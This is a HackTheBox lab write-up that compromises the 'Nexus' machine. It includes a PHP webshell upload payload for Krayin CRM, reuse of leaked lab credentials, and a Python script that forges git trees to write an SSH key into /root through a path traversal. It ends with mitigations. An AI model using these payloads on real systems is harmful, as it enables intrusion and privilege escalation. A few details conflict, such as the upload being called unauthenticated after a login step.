
# ╔══════════════════════════════════════════════════════════════╗
# ║     🌌  N E X U S   —   F U L L   C O M P R O M I S E     ║
# ║     HackTheBox  |  OS: Linux  |  Difficulty: Easy   ║
# ╚══════════════════════════════════════════════════════════════╝

> **Tags:** `linux` `web` `krayin-crm` `gitea` `path-traversal`

```
                    ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
                    ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
                    ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
                    ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
                    ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
                    ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
```

```
  ╔══════════════════════════════════════════════════════════════════╗
  ║                   🎯  ATTACK CHAIN OVERVIEW                     ║
  ╚══════════════════════════════════════════════════════════════════╝

  Recon ─→ Krayin CRM (TinyMCE RCE) ─→ MySQL Creds ─→ SSH as jones
    │                                                            │
    ├─ Port Scan: 22, 80, 3306, 3000                             │
    ├─ Subdomain: billing.nexus.htb (Krayin CRM)                  │
    ├─ Subdomain: git.nexus.htb (Gitea v1.26.0)                  │
    └─ n8n.bloodflow.htb, bloodflow.htb (dead ends)               │
                                                                  ▼
                                          Gitea Template Repo ─→ Path Traversal
                                                                    │
                                                                    ▼
                                                              ROOT SHELL
```

---

## 🔍 PHASE 1: RECONNAISSANCE

### Port Scan

```bash
sudo nmap -sC -sV -p- 10.129.234.54 -oA nexus
```

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.2p1 Debian (Ubuntu Linux)
80/tcp   open  http       nginx 1.24.0
3306/tcp open  mysql      MySQL 8.0.45
3000/tcp open  http       Gitea v1.26.0  (proxied via nginx)
```

### Subdomain Enumeration

```bash
ffuf -u http://nexus.htb -H "Host: FUZZ.nexus.htb" -w /usr/share/wordlists/subdomains.txt
```

```
┌─────────────────┬──────────┬──────────────────────────────────┐
│   Subdomain     │  Service │             Note                  │
├─────────────────┼──────────┼──────────────────────────────────┤
│ billing         │ Krayin   │ CRM portal at /admin/login        │
│                 │ CRM      │ Laravel-based PHP application     │
├─────────────────┼──────────┼──────────────────────────────────┤
│ git             │ Gitea    │ Self-hosted Git service v1.26.0   │
│                 │          │ Found admin/krayin-docker-setup   │
├─────────────────┼──────────┼──────────────────────────────────┤
│ n8n (bloodflow) │ n8n      │ Workflow automation (decoys)      │
└─────────────────┴──────────┴──────────────────────────────────┘
```

---

## 🚪 PHASE 2: KRAYIN CRM — INITIAL ACCESS

### Step 1: Discover Credentials

> 🔍 **Gitea Repo Dive** — The `admin/krayin-docker-setup` repository had a `.env` file.
> In the commit history, the original DB password was leaked!

```
Email:    j.matthew@nexus.htb
DB Pass:  y27xb3ha!!74GbR
```

### Step 2: Login to Krayin CRM

```
billing.nexus.htb/admin/login
```

![Login Screen](https://res.cloudinary.com/dbvhkeaql/image/upload/v1782291938/maverick-blog/qdhfzvrpvqhopggyvaw0.png)

### Step 3: Exploit TinyMCE File Upload (CVE-2026-38526)

Krayin CRM v2.2.0 is vulnerable to **unrestricted file upload** via the TinyMCE editor.

```
┌─────────────────────────────────────────────────────────────────┐
│  CVE-2026-38526                                                 │
│  Type:  Unrestricted File Upload → RCE                          │
│  CVSS:  9.9 (Critical)                                          │
│  Endpoint: /admin/tinymce/upload                                │
└─────────────────────────────────────────────────────────────────┘
```

**Exploit — Modify the TinyMCE upload request:**

```
POST /admin/tinymce/upload HTTP/1.1
Host: billing.nexus.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php echo shell_exec($_GET["c"]); ?>
```

💥 **Result:** `http://billing.nexus.htb/storage/tinymce/<hash>.php?c=id`

```
  ╔══════════════════════════════════════════════════════╗
  ║   ☣  RCE OBTAINED  —  www-data shell acquired  ☣   ║
  ╚══════════════════════════════════════════════════════╝
```

```php
// Webshell verification
$ curl "http://billing.nexus.htb/storage/tinymce/b5a28ff...php?c=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Step 4: Read the Laravel .env

```bash
$ cat /var/www/krayin/.env
```

```
┌───────────────────────────────────────────────────────────┐
│  Loot from .env                                            │
├───────────────────────────────────────────────────────────┤
│  DB_HOST=localhost                                         │
│  DB_DATABASE=krayin                                        │
│  DB_USERNAME=krayin                                        │
│  DB_PASSWORD=y27xb3ha!!74GbR                               │
│  APP_KEY=base64:0V+FhE/rju6U8vv53I1f5CLJmLkHvuaXlBFDGla… │
└───────────────────────────────────────────────────────────┘
```

---

## 🧑‍💻 PHASE 3: LATERAL MOVE — SSH as jones

> The same DB password works for **SSH** because of password reuse!

```bash
$ ssh jones@10.129.234.54
Password: y27xb3ha!!74GbR
```

```
  ╔══════════════════════════════════════════════════╗
  ║   🚪  LATERAL MOVE: www-data → jones   🚪      ║
  ╚══════════════════════════════════════════════════╝
```

### 🚩 User Flag Captured

```bash
jones@nexus:~$ cat user.txt
```

```
╔═══════════════════════════════════════════════╗
║  🏁  USER FLAG                                ║
║  967262def69da0d4016fd3959d8e3d16            ║
╚═══════════════════════════════════════════════╝
```

---

## 👑 PHASE 4: PRIVILEGE ESCALATION — ROOT

### The Crown Jewel: template-sync.py

Discovered a Python script running as **ROOT** every minute via systemd timer:

```
/etc/systemd/system/gitea-template-sync.timer  →  fires every 60s
/etc/systemd/system/gitea-template-sync.service →  runs as root
/etc/gitea/template-sync.py                    →  the vulnerable script
```

### 🔬 Vulnerability Analysis

```
┌─────────────────────────────────────────────────────────────────┐
│  📄 /etc/gitea/template-sync.py                                │
│                                                                 │
│  def sync_template(repo_info):                                  │
│      for mode, objhash, filepath in entries:                    │
│          target = os.path.join(staging_path, filepath) ← 💀     │
│                                                                 │
│  🔴 BUG: os.path.join() + filepath from git ls-tree            │
│  🔴 IMPACT: Absolute path traversal → write ANYWHERE as root   │
│                                                                 │
│  The script:                                                    │
│  1. Queries Gitea API for repos where template=true             │
│  2. Fetches the repo via git clone                             │
│  3. Processes git ls-tree output — filepath goes DIRECTLY      │
│     into os.path.join() with no sanitization!                   │
│  4. If filepath is "../../../root/.ssh/authorized_keys",        │
│     os.path.join() happily resolves to /root/.ssh/...          │
└─────────────────────────────────────────────────────────────────┘
```

### 🧬 Building the Exploit

**Step 1:** Create a template repo on Gitea

```bash
$ curl -s -X POST 'http://git.nexus.htb/api/v1/user/repos' \
  -u 'jones:y27xb3ha!!74GbR' \
  -H 'Content-Type: application/json' \
  -d '{"name":"exploit","template":true}'
```

**Step 2:** Generate SSH key pair (on target)

```bash
$ ssh-keygen -t ed25519 -f /tmp/.k -N ""
```

**Step 3:** Craft malicious git objects with path traversal

```python
#!/usr/bin/env python3
""" build.py — crafts git objects that escape staging directory """
import hashlib, zlib, os, subprocess, time

def write_obj(data, t):
    h = (f"{t} {len(data)}").encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return f"{mode} {name}".encode() + b"\x00" + bytes.fromhex(sha)

key = open("/tmp/.k.pub").read().strip() + "\n"

blob  = write_obj(key.encode(), "blob")               # public key content
readme= write_obj(b"# Template\n", "blob")              # dummy README
ssh_t = write_obj(entry("100644","authorized_keys",blob), "tree")  # .ssh/
cur   = write_obj(entry("40000",".ssh",ssh_t), "tree")              # root/.ssh/
fir   = write_obj(entry("40000","root",cur), "tree")               # ../../.. etc
for i in range(4):
    fir = write_obj(entry("40000","..",fir), "tree")               # ⬆ traverse up!
root  = write_obj(entry("100644","README.md",readme) +
                  entry("40000","..",fir), "tree")
```

> 🔑 **The Magic Trick:** The tree objects craft `../../../../root/.ssh/authorized_keys` as the filepath. When `os.path.join(staging_path, "../../../../root/.ssh/authorized_keys")` evaluates... it **escapes the sandbox** and writes to `/root/.ssh/`!

**Step 4:** Push to Gitea

```bash
$ cd /tmp/exploit && git init
$ git remote add origin http://jones:password@localhost:3000/jones/exploit.git
$ python3 /tmp/build.py
$ git push origin main
```

### ⏳ From Push to Pwn

```
⏰ timer fires → template-sync.py runs as ROOT
   │
   ├─ Queries Gitea API → finds "jones/exploit" (template)
   ├─ git clone → processes git objects
   ├─ ls-tree outputs: ../../../../root/.ssh/authorized_keys
   ├─ os.path.join(staging, "../../../../root/.ssh/authorized_keys")
   │    ↓
   │  = /root/.ssh/authorized_keys   ← 💥 sandbox escape!
   │
   └─ Writes our SSH public key → root login achieved
```

```
  ╔══════════════════════════════════════════════════════╗
  ║  🔓 TEMPLATE-SYNC LOG — PATH TRAVERSAL CONFIRMED    ║
  ╚══════════════════════════════════════════════════════╝

  [06:28:41] Syncing template: jones/exploit
  [06:28:41]   synced: README.md
  [06:28:41]   synced: ../../../../../root/.ssh/authorized_keys   ← 🎯
```

### 🏆 Root Shell

```bash
$ ssh -i /tmp/.k root@10.129.234.54
root@nexus:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```
╔═══════════════════════════════════════════════╗
║  👑  ROOT FLAG                                ║
║  dc53674e6182c48d02e729528c426ad0            ║
╚═══════════════════════════════════════════════╝
```

---

## 📊 ATTACK CHAIN SUMMARY

```
┌──────────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  🌐 RECON        │ ──→ │  💻 KRAYIN RCE    │ ──→ │  🔑 SSH AS jones  │
│  nmap, ffuf     │     │  TinyMCE Upload   │     │  Password reuse  │
│  subdomains      │     │  CVE-2026-38526   │     │  user.txt found  │
└──────────────────┘     └──────────────────┘     └──────────────────┘
                                                          │
                                                          ▼
┌──────────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  👑 ROOT SHELL   │ ←── │  📂 PATH TRAVERSAL│ ←── │  🐙 GITEA EXPLOIT │
│  SSH authorized  │     │  template-sync.py │     │  Template Repo   │
│  root.txt found  │     │  os.path.join()   │     │  Git objects     │
└──────────────────┘     └──────────────────┘     └──────────────────┘
```

## 🛠️ KEY VULNERABILITIES

| # | Vulnerability | CVSS | Impact |
|---|--------------|:----:|--------|
| 1 | **CVE-2026-38526** — Krayin TinyMCE RCE | 9.9 | Unauthenticated file upload → webshell |
| 2 | **Password Reuse** — .env → SSH | — | Lateral movement to jones |
| 3 | **Path Traversal** — template-sync.py | 8.8 | `os.path.join()` → arbitrary root write |

## 🔐 MITIGATIONS

```
┌─────────────────────────────────────────────────────────────────┐
│ 🛡️  Fixes for this box:                                        │
│                                                                 │
│  • ✅ Sanitize git ls-tree filepaths — reject "../" or          │
│       absolute paths before os.path.join()                      │
│  • ✅ Restrict template-sync to specific trusted repos          │
│  • ✅ Rotate DB passwords — don't reuse for SSH/Gitea           │
│  • ✅ Limit TinyMCE upload to images only with MIME validation  │
│  • ✅ Run template-sync.py as non-root user                     │
└─────────────────────────────────────────────────────────────────┘
```

---

```
  ╔══════════════════════════════════════════════════════════════╗
  ║         🎉  NEXUS FULLY OWNED — BOTH FLAGS CAPTURED  🎉    ║
  ║                                                              ║
  ║    "The connection between systems is the weakest link.      ║
  ║     A CRM leads to a database, a database to SSH, a Git     ║
  ║     server to a root cron, and a Python join() to root."    ║
  ╚══════════════════════════════════════════════════════════════╝
```

---

*Writeup generated by 0xTonyb "Nexus" — 25th June 2026*
